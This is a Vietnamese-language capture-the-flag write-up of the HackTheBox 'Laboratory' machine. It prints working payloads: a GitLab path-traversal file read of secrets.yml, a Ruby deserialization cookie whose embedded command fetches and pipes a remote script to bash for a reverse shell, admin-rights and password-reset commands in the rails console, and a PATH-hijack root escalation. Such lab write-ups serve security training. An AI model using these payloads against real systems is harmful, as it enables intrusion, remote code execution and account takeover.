---
title: HackTheBox — Laboratory Writeup
date: 16/8/2021
layout: single
header:
  teaser: https://coldfusionx.github.io/assets/img/Posts/Laboratory.png
--- 


![1](https://coldfusionx.github.io/assets/img/Posts/Laboratory.png)

# Mô tả 
Tác giả: Mayank Deshmukh

> Phòng thí nghiệm bắt đầu với việc phát hiện ra một phiên bản GitLab dễ bị tấn công đang chạy trên hộp. Tác giả  sẽ tham khảo một báo cáo của HackerOne để khai thác một CVE được liên kết với nó để lấy lỗ hổng đọc tệp tùy ý và xâu chuỗi nó lại để nhận được thực thi Mã từ xa trên vùng chứa GitLab. Tiếp theo, tác giả sử dụng bảng điều khiển Gitlab rails để thao tác dữ liệu người dùng đang hoạt động và giành quyền truy cập vào kho lưu trữ riêng tư của quản trị viên, nơi tác giả phát hiện ra khóa SSH. Đối với các đặc quyền leo thang để root, tác giả khai thác tệp nhị phân SUID không gọi tệp nhị phân chmod từ đường dẫn tuyệt đối của nó, tác giả mạo tệp nhị phân chmod độc hại, cập nhật PATH dẫn đến việc nó chạy dưới dạng root.



# Reconnaissance
## masscan

Quét ban đầu cổng bằng cách sử dụng `masscan` và `nmap`

```powershell
cfx:  ~/Documents/htb/laboratory
→ masscan -e tun0 -p1-65535 --rate 500 10.10.10.216 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-15 19:08:30 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.216
Discovered open port 80/tcp on 10.10.10.216
Discovered open port 443/tcp on 10.10.10.216
```
## Nmap

```powershell
cfx:  ~/Documents/htb/laboratory
→ nmap -sC -sV -p22,80,443 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 01:24 IST
Nmap scan report for laboratory.htb (10.10.10.216)
Host is up (0.075s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
```
Các cổng được quét

+ Port 22 - SSH
+ Port 80 - HTTP
+ Port 443 - HTTPS

Nhìn vào kết quả `nmap`, chúng ta có thể thấy chứng chỉ TLS có các mục `DNS laboratory.htb` và `git.laboratory.htb` do đó tác giảthêm cả hai máy chủ ảo vào /etc/hosts

## Cổng 443: Website
Truy cập trang web trên Cổng 80 chuyển hướng  đến trang web HTTPS:

![2](https://coldfusionx.github.io/assets/img/Posts/Laboratory/website.png)

Trang web có tiêu đề là `Phòng thí nghiệm` - Nhà cung cấp dịch vụ An ninh mạng

Lướt qua trang web theo cách thủ công và ffuf không tiết lộ bất cứ điều gì thú vị

## Cổng 443: Trên GitLab
Tại `git.laboratory.htb`, tác giả tìm thấy một phiên bản của phiên bản cộng đồng GitLab

![3](https://coldfusionx.github.io/assets/img/Posts/Laboratory/gitlab.png)

Vì tác giả  chưa có bất kỳ tín dụng hoặc tên người dùng nào được liên kết với hộp này, vào đó tác giả  sẽ sử dụng chức năng Đăng ký để đăng ký tài khoản cho chính mình

Chức năng Đăng ký dường như chấp nhận đăng ký với miền email `laboratory.htb` do đó tác giả  sử dụng `cfx@laboratory.htb`

![3](https://coldfusionx.github.io/assets/img/Posts/Laboratory/register.png)

Sau khi đăng nhập, trong Dự án -> Khám phá dự án, tác giả tìm thấy một dự án có tên là SecureWebsite

![4](https://coldfusionx.github.io/assets/img/Posts/Laboratory/explore.png)

Nhìn vào nội dung dự án, nó có vẻ là mã nguồn của trang web Phòng thí nghiệm, không bao gồm bất kỳ nội dung nhạy cảm nào

![5](https://coldfusionx.github.io/assets/img/Posts/Laboratory/source.png)

Dự án thuộc sở hữu của Dexter McPherson với tên người dùng dexter có thể là một người dùng tiềm năng trên hộp

![6](https://coldfusionx.github.io/assets/img/Posts/Laboratory/owner.png)

## GitLab Version
Trang trợ giúp tiết lộ phiên bản của GitLab là GitLab Community Edition 12.8.1:

![7](https://coldfusionx.github.io/assets/img/Posts/Laboratory/version.png)

## Lỗ hổng bảo mật - CVE-2020-10977
Tìm kiếm các lỗ hổng liên quan đến GitLab 12.8.1, tác giả  bắt gặp `CVE-2020-10977` là một lỗ hổng đọc tệp tùy ý

## Shell as git
Có một Báo cáo [HackerOne](https://hackerone.com/reports/827052) mà chúng ta sẽ tham khảo để khai thác lỗ hổng này

## LFI
Bước 1: Đầu tiên, tác giả tạo hai dự án

![8](https://coldfusionx.github.io/assets/img/Posts/Laboratory/s1.png)

Bước 2: Tiếp theo, chúng ta đi đến dự án lạnh tạo sự cố với tải trọng LFI trong phần mô tả:

```powershell
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

![9](https://coldfusionx.github.io/assets/img/Posts/Laboratory/s2.png)

Bước 3: Sau khi gửi vấn đề, hãy sử dụng tùy chọn Di chuyển nằm ở phía dưới bên phải và chọn kết hợp dự án:

![10](https://coldfusionx.github.io/assets/img/Posts/Laboratory/s3.png)

Bước 4: Tác giả sẽ tìm thấy tệp được liên kết với vấn đề thứ hai của dự án

![11](https://coldfusionx.github.io/assets/img/Posts/Laboratory/s4.png)

Nhấp vào nó sẽ tải xuống tệp

```powershell
cfx:  ~/Documents/htb/laboratory
→ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[..SNIP..]
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh -
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh -
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh -
```

## LFI -> RCE
Báo cáo [HackerOne](https://hackerone.com/reports/827052) cũng cho thấy cách tác giả  có thể tận dụng LFI để Thực thi mã từ xa khai thác lỗ hổng Deserialization bên trong cookie `Experimentation_subject_id`

Bước 1: Nắm bắt bí mật.yml:

Để quản lý cuộc tấn công RCE, trước tiên chúng ta cần lấy tệp `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` mà chúng ta có thể thực hiện bằng cách sao chép cuộc tấn công LFI với tải trọng sau:

```powershell
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
```
```powershell
cfx:  ~/Documents/htb/laboratory
→ cat secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu
    YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV
    RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt
[..SNIP..]
```

Giá trị `secret_key_base` là giá trị mà tác giả quan tâm để thực hiện cuộc tấn công này

```powershell
secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

Bước 2: Nhân rộng Môi trường GitLab CE 12.8.1\

Tiếp theo, để xây dựng tải trọng Deserialization, chúng ta cần tạo ra một bản sao của cá thể GitLab dễ bị tấn công. tác giả sẽ sử dụng docker để làm như vậy

+ Cài đặt docker: `sudo apt install docker.io`
+ Kéo hình ảnh GitLab dễ bị tổn thương: `docker pull gitlab/gitlab-ce:12.8.1-ce.0` 
+ Đang chạy hình ảnh Docker: `docker run gitlab/gitlab-ce:12.8.1-ce.0`

Sẽ mất vài phút để khởi động vùng chứa, trong một thiết bị đầu cuối mới, chúng ta có thể kiểm tra quy trình docker và đồng thời lấy shell trên đó

```powershell
cfx:  ~/Documents/htb/laboratory
→ docker ps
CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                             PORTS                     NAMES
55c5745c3e56        gitlab/gitlab-ce:12.8.1-ce.0   "/assets/wrapper"   29 seconds ago      Up 24 seconds (health: starting)   22/tcp, 80/tcp, 443/tcp   friendly_volhard

cfx:  ~/Documents/htb/laboratory
→ docker exec -it friendly_volhard /bin/bash

root@55c5745c3e56:/# ls
RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Bước 3: Thay thế secret_key_base trong phiên bản GitLab của riêng tác giả

Tiếp theo, chúng ta cần thay thế giá trị của secret_key_base bên trong `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` bằng giá trị mà chúng ta nhận được:

```shell
secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

```powershell
root@55c5745c3e56:/# cat /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 1d72fbc9d369dca31357808e440be37d793ae1f1dd526cec9bd9cac74567c3eadbb34e8cfa61aa443e3b5f374afb3a5c12f279bc2fd6e30cf675962e0805afa5
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: 49aa7a32e98f1781455387cc636958cf8e270dd9f3caf1e7381b0d0327d255b3ab4ce9e052e2fe428fa91661a5e9a222365710bc007ef5e4bcf92cdc78639981
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKQIBAAKCAgEA5IsR3b8jGt7wTpQh98HqX09hpyLO+SXRwsa0eLGUL8KnY/5b
    KgQSQ1WW3re6g5Q534duvUltf0O3Yhk9Daq6J8bRTJX+tbOZKdGw00Qbyt9zjCf5
[..SNIP..]
```
Bước 4: Generating Payload

Tiếp theo, chúng ta cần chạy lệnh sau trong bảng điều khiển rails:

```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `curl http://10.10.14.24:8080/rev.bash | bash` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

```powershell
root@55c5745c3e56:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> request = ActionDispatch::Request.new(Rails.application.env_config)
=> #<ActionDispatch::Request:0x00007ff69e3917b8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false,
[..SNIP..]

irb(main):002:0> request.env["action_dispatch.cookies_serializer"] = :marshal
=> :marshal

irb(main):003:0> cookies = request.cookie_jar
=> #<ActionDispatch::Cookies::CookieJar:0x00007ff69eb70e98 @set_cookies={}, @delete_cookies={}, @request=#<ActionDispatch::Request:0x00007ff69e3917b8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false,
[..SNIP..]
```

Thiết lập tải trọng, Ban đầu khi tôi thực hiện hộp này, tôi đã gặp khó khăn khi gửi trực tiếp tải trọng trình bao ngược lại, vì vậy Ở đây tôi sẽ cuộn một tệp `rev.bash` có chứa trình bao ngược Python từ máy chủ Web của tôi và chuyển nó thành bash:

```ruby
irb(main):004:0> erb = ERB.new("<%= `curl http://10.10.14.24:8080/rev.bash | bash` %>")
=> #<ERB:0x00007ff699607498 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `curl http://10.10.14.24:8080/rev.bash | bash` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>
```

Ở đây, hai lệnh tiếp theo sẽ cố gắng tìm nạp tệp và chạy chính tải trọng tại đây, vì vậy chúng ta không nên chạy máy chủ web trong khi thực hiện các lệnh này, Ngoài ra, trong trường hợp bạn đang gửi trực tiếp tải trọng shell ngược thì bạn không nên chạy trình nghe trong khi gửi các lệnh này lệnh:

```ruby
irb(main):005:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.24 port 8080: Connection refused
=> ""

irb(main):006:0> cookies.signed[:cookie] = depr
DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):7)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.24 port 8080: Connection refused
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.24 port 8080: Connection refused
=> ""

```

Cuối cùng tạo ra giá trị cookie:

```ruby
irb(main):007:0> puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--c13c402abdc9f0aabfd22f5544ab2d713e509334
=> nil
irb(main):009:0> quit
```

Bước 5: Thực hiện

Bây giờ chúng ta đã có giá trị cookie sẵn sàng, chúng ta sẽ chạy lệnh `curl` để thả cho chúng ta một trình bao đảo ngược:

```powershell
cfx:  ~/Documents/htb/laboratory
→ curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvO
kBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5
jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48P
CgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkV
GOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lb
m9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ
6OkRlcHJlY2F0aW9uAAY7ClQ=--c13c402abdc9f0aabfd22f5544ab2d713e509334"
```

Đảm bảo khởi động máy chủ web và trình nghe nc trước khi thực hiện lệnh curl

![12](https://coldfusionx.github.io/assets/img/Posts/Laboratory/shell.png)

```powershell
cfx:  ~/Documents/htb/laboratory
→ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.216.
Ncat: Connection from 10.10.10.216:57334.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=998(git) gid=998(git) groups=998(git)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
git@git:~/gitlab-rails/working$
```
## Shell as dexter

## Enumeration
Việc liệt kê ban đầu xác nhận rằng chúng ta đang ở trong một vùng chứa docker

```powershell
git@git:/$ hostname -i
172.17.0.2
git@git:/$ hostname
git.laboratory.htb
```

Ngoài ra, có `.dockerenv` để xác nhận điều tương tự

```powershell
git@git:/$ ls -la
total 88
drwxr-xr-x   1 root root 4096 Jul  2  2020 .
drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Apr 21 05:04 dev
drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
[..SNIP..]
```
Bây giờ, cách tiếp cận tiếp theo của tác giả là thoát khỏi vùng chứa này hoặc nâng cao các đặc quyền để root trong vùng chứa này, tuy nhiên không có điều nào trong số đó là khả thi ở đây

## GitLab - Quyền truy cập Dự án SecureDocker
Vì chúng ta đang ở bên trong vùng chứa GitLab, chúng ta có thể sử dụng bảng điều khiển Gitlab-rails để thao tác dữ liệu người dùng GitLab: Đây là một số Cheatsheet mà tôi đã tham khảo ban đầu: [Cheatsheet1](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html) & [Cheatsheet](https://docs.gitlab.com/ee/security/reset_user_password.html)

## Admin Priv - Self
Thứ nhất, Tác giả có thể tự cấp cho mình đặc quyền quản trị viên

```powershell
git@git:~$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> User.active
User.active
=> #<ActiveRecord::Relation [#<User id:4 @seven>, #<User id:1 @dexter>, #<User id:5 @tuser>, #<User id:6 @cfx>]>
irb(main):002:0> User.admins
User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
irb(main):003:0> cfx.admin = true
cfx.admin = true
irb(main):004:0> cfx.save
cfx.save
=> true
```

![13](https://coldfusionx.github.io/assets/img/Posts/Laboratory/adm.png)

Giờ đây, tác giả có thể thấy biểu tượng quản trị viên trên tài khoản của mình, do đó tác giả hiện có thể truy cập Dự án `SecureDocker` của Dexter

## Đặt lại mật khẩu - Dexter
Tác giả thấy Dexter là quản trị viên duy nhất, vì vậy tác giả thậm chí có thể đặt lại mật khẩu của anh ấy

```powershell
git@git:/$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)

irb(main):001:0> user = User.where(id: 1).first
=> #<User id:1 @dexter>
irb(main):002:0> user.password = 'cold_fusion'
=> "cold_fusion"
irb(main):003:0> user.password_confirmation = 'cold_fusion'
=> "cold_fusion"
irb(main):004:0> user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: f4543159-759e-4879-885e-8688d65ec401) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007fa1b4dcbda8 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
irb(main):005:0> exit()
```

## SSH - Dexter

Bây giờ chúng ta có thể đăng nhập vào GitLab với tư cách là dexter, nơi chúng ta thấy một Project `SecureDocker` khác:

![14](https://coldfusionx.github.io/assets/img/Posts/Laboratory/dexter.png)

Bên trong dự án, điều đầu tiên tác giả tìm thấy là một todo.txt có vẻ là một loại danh sách nhiệm vụ đang chờ xử lý:

```shell
# DONE: Secure docker for regular users
### DONE: Automate docker security on startup
# TODO: Look into "docker compose"
# TODO: Permanently ban DeeDee from lab
```

Thoạt nhìn, nó không có nhiều ý nghĩa nên chúng ta sẽ xem xét sau

Nhưng điều thú vị hơn là trình dexter thư mục chứa thư mục `.ssh` với khóa ssh riêng

![15](https://coldfusionx.github.io/assets/img/Posts/Laboratory/ssh.png)

Sử dụng khóa này, chúng ta có thể SSH dưới dạng dexter:

```powershell
cfx:  ~/Documents/htb/laboratory
→ ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$ id
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
dexter@laboratory:~$ whoami
dexter
```

Lấy `user.txt`:

```powershell
dexter@laboratory:~$ cat user.txt
7c447991fdff874*****************
```

## PrivEsc dexter -> root

## Enumeration

Tìm kiếm mã nhị phân `SUID`, tác giả tìm thấy một trong `/usr/local/bin/`

> `usr/local/bin` là vị trí cho tất cả các tệp thi hành bổ trợ mà bạn thêm vào hệ thống sẽ được tất cả người dùng sử dụng làm tệp hệ thống chung nhưng không phải là tệp chính thức được HĐH hỗ trợ

```powershell
dexter@laboratory:~$ find / -perm -u=s -type f 2>/dev/null | grep -v 'snap' | xargs ls -la
-rwsr-sr-x 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        85064 May 28  2020 /usr/bin/chfn
-rwsr-xr-x 1 root   root        53040 May 28  2020 /usr/bin/chsh
-rwsr-xr-x 1 root   root        39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root        88464 May 28  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        55528 Apr  2  2020 /usr/bin/mount
-rwsr-xr-x 1 root   root        44784 May 28  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        68208 May 28  2020 /usr/bin/passwd
-rwsr-xr-x 1 root   root        31032 Aug 16  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root        67816 Apr  2  2020 /usr/bin/su
-rwsr-xr-x 1 root   root       166056 Jan 19 14:21 /usr/bin/sudo
-rwsr-xr-x 1 root   root        39144 Apr  2  2020 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus  51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       473576 May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   dexter      16720 Aug 28  2020 /usr/local/bin/docker-security
```

> /usr/local/bin/docker-security có vẻ là thứ đã được đề cập trong todo.txt nên có lẽ đây là mục tiêu tiếp theo của tác giả

Nhưng khi chạy nó không có gì xảy ra:

```powershell
dexter@laboratory:~$ docker-security
dexter@laboratory:~$
```

Vì vậy, có thể chạy nó với ltrace:

```powershell
dexter@laboratory:~$ ltrace docker-security
setuid(0)                                                                                                                         = -1
setgid(0)                                                                                                                         = -1
system("chmod 700 /usr/bin/docker"/tmp/chmod: 1: cannot create /root/.ssh/authorized_keys: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                            = 512
system("chmod 660 /var/run/docker.sock"/tmp/chmod: 1: cannot create /root/.ssh/authorized_keys: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                            = 512
+++ exited (status 0) +++
```
Nhìn vào dấu vết, nhị phân đang gọi `system("chmod 700 /usr/bin/docker")`. Bây giờ, điều thú vị cần lưu ý là `chmod` không được gọi từ đường dẫn tuyệt đối của nó mà phải là `/usr/bin/chmod`

```powershell
dexter@laboratory:~$ which chmod
/usr/bin/chmod
```
Đường dẫn hiện tại:

```shell
dexter@laboratory:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```
Vì vậy, tác gủa có thể giả mạo `chmod` của riêng mình, cập nhật đường dẫn và nhầm lẫn ứng dụng thực thi `chmod` của tác giả

Tác giả  sẽ tạo khóa ssh bằng `ssh-keygen -f cfx`:

```powershell
dexter@laboratory:/tmp$ cat chmod
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJ4KUY9Dzy4UKYRwT+ORSIGW1W2YSKQrqIlNfRksWqWOz3bCJCE5gImrgx/lsL/kItrEvy9js4nQ1zmUrJ6kSYU7[..SNIP..]Rws4b8UeKpU+ft6Uk root@cfx" > /root/.ssh/authorized_keys

dexter@laboratory:/tmp$ chmod +x chmod
dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
```

Đã cập nhật PATH:

```shell
dexter@laboratory:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

Điều này chắc đã sao chép thành công khóa ssh công khai của tác giả vào `/root/.ssh/authorized_keys` vì vậy tác giả có thể SSH dưới dạng root mà không cần khóa riêng tư

## SSH - root

```powershell
cfx:  ~/Documents/htb/docker
→ ssh -i cfx root@10.10.10.216
root@laboratory:~# id
uid=0(root) gid=0(root) groups=0(root)
root@laboratory:~# whoami
root
```

Lấy root.txt:

```powershell
root@laboratory:~# cat root.txt
0bc02b1afb2b28******************
```

## Cảm ơn bạn đã đọc, Đề xuất & Phản hồi được đánh giá cao!

+ Đánh giá link bài viết [posts/LaboratoryHTB/](https://coldfusionx.github.io/posts/LaboratoryHTB/#ssh---root)

